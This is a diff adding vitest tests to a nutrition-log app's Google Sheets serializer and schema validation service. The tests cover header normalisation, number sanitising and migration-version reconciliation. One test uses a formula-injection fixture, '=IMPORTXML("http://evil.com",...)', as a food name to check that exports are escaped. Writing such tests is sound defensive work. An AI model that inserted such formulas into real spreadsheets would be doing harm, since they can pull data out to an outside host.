@@ -107,6 +107,108 @@ describe('Dynamic Header Mapping in Serializers', () => {
     expect(doc._deleted).toBe(false);
   });
 
+  it('correctly matches headers with casing differences and extra whitespace', () => {
+    const dirtyHeaders = [
+      '  ID  ',
+      'DATE ',
+      ' TIMESTAMP',
+      ' Meal_Type ',
+      'FOOD_REFERENCE_ID',
+      ' Food_Name ',
+      ' Quantity ',
+      ' Portion_Name ',
+      ' CALORIES ',
+      ' Protein ',
+      ' Carbs ',
+      ' FATS ',
+      ' updatedAt '
+    ];
+
+    const row = {
+      id: 'log-dirty',
+      headers: dirtyHeaders,
+      values: [
+        'log-dirty',
+        '2026-09-20',
+        '2026-09-20T10:00:00Z',
+        'meal_snack',
+        'food-apple-1',
+        'Manzana Roja',
+        2,
+        'unidad',
+        104,
+        0.5,
+        28,
+        0.3,
+        1726700000000
+      ]
+    };
+
+    const doc = dailyLogsSerializer.rowToDoc(row);
+    expect(doc.id).toBe('log-dirty');
+    expect(doc.date).toBe('2026-09-20');
+    expect(doc.meal_type).toBe('meal_snack');
+    expect(doc.food_name).toBe('Manzana Roja');
+    expect(doc.macros.calories).toBe(104);
+    expect(doc.macros.protein).toBe(0.5);
+  });
+
+  it('escapes Formula Injection on export and sanitizes on import', () => {
+    const maliciousDoc = {
+      id: 'log-vuln-1',
+      date: '2026-09-20',
+      timestamp: '2026-09-20T12:00:00Z',
+      meal_type: 'meal_lunch',
+      food_reference_id: 'food-x',
+      food_name: '=IMPORTXML("http://evil.com","//data")',
+      quantity: 1,
+      portion_name: 'g',
+      macros: { calories: 100, protein: 10, carbs: 10, fats: 2 }
+    };
+
+    const row = dailyLogsSerializer.docToRow(maliciousDoc);
+    // The exported food_name must be escaped with a leading single quote
+    const foodNameVal = row.values[5];
+    expect(String(foodNameVal).startsWith("'=")).toBe(true);
+
+    // On import (rowToDoc), formula prefix is safely unescaped without executing
+    const importedDoc = dailyLogsSerializer.rowToDoc({
+      id: 'log-vuln-1',
+      headers: dailyLogsSerializer.headers,
+      values: row.values
+    });
+    expect(importedDoc.food_name).toBe('=IMPORTXML("http://evil.com","//data")');
+    expect(importedDoc.food_name.startsWith("'=")).toBe(false);
+  });
+
+  it('sanitizes invalid numbers (NaN, Infinity, negative) to safe defaults', () => {
+    const invalidRow = {
+      id: 'log-invalid-nums',
+      headers: dailyLogsSerializer.headers,
+      values: [
+        'log-invalid-nums',
+        '2026-09-20T12:00:00Z',
+        '2026-09-20',
+        'meal_lunch',
+        'food-x',
+        'Test Food',
+        -5, // invalid negative quantity
+        '100g',
+        'NotANumber', // NaN calories
+        Infinity, // Infinity protein
+        -20, // negative carbs
+        0.5 // valid fats
+      ]
+    };
+
+    const doc = dailyLogsSerializer.rowToDoc(invalidRow);
+    expect(doc.quantity).toBe(0);
+    expect(doc.macros.calories).toBe(0);
+    expect(doc.macros.protein).toBe(0);
+    expect(doc.macros.carbs).toBe(0);
+    expect(doc.macros.fats).toBe(0.5);
+  });
+
   it('correctly maps base_ingredients doc fields when columns are reordered', () => {
     const reorderedHeaders = [
       'name',
@@ -201,6 +303,69 @@ describe('Google ValidationService & Repair Strategy', () => {
     expect(health.valid).toBe(false);
     expect(health.missingColumns['daily_logs']).toContain('calories');
     expect(health.missingColumns['daily_logs']).toContain('meal_type');
+  });
+
+  it('reconciles schema version if _migrations tab contains a newer version than appProperties', async () => {
+    let appPropertiesUpdated = false;
+
+    mockHttpClient = {
+      fetch: vi.fn(async (url: string, init?: RequestInit) => {
+        if (url.includes('/drive/v3/files/sheet_logs') && init?.method === 'PATCH') {
+          appPropertiesUpdated = true;
+          return new Response(JSON.stringify({}), { status: 200 });
+        }
+
+        if (url.includes('/drive/v3/files/sheet_logs')) {
+          return new Response(JSON.stringify({
+            modifiedTime: '2026-09-18T20:00:00Z',
+            // Stale appProperties indicates version 0
+            appProperties: { quomida_schema_version: '0' }
+          }), { status: 200 });
+        }
+
+        if (url.includes('/v4/spreadsheets/sheet_logs') && !url.includes('/values')) {
+          return new Response(JSON.stringify({
+            sheets: [
+              { properties: { title: 'daily_logs', sheetId: 0 } },
+              { properties: { title: '_migrations', sheetId: 1 } }
+            ]
+          }), { status: 200 });
+        }
+
+        if (decodeURIComponent(url).includes('_migrations!A2:B')) {
+          // Spreadsheet _migrations tab records version 1 as applied
+          return new Response(JSON.stringify({
+            valueRanges: [
+              {
+                range: '_migrations!A2:B',
+                values: [['1', '2026-09-18T20:05:00Z']]
+              }
+            ]
+          }), { status: 200 });
+        }
+
+        if (url.includes('/values:batchGet')) {
+          const allHeaders = QuomidaDailyLogsSpreadsheetSchema.tabs[0].columns.map(c => c.name);
+          return new Response(JSON.stringify({
+            valueRanges: [
+              {
+                range: 'daily_logs!1:1',
+                values: [allHeaders]
+              }
+            ]
+          }), { status: 200 });
+        }
+
+        return new Response('Not Found', { status: 404 });
+      })
+    };
+
+    const validationService = new ValidationService(() => 'test-token', mockHttpClient);
+    const health = await validationService.checkHealth('sheet_logs', QuomidaDailyLogsSpreadsheetSchema);
+
+    expect(health.currentVersion).toBe(1);
+    expect(health.status).toBe(ValidationStatus.READY);
+    expect(appPropertiesUpdated).toBe(true);
   });
 
   it('repairs missing columns non-destructively after creating a backup', async () => {
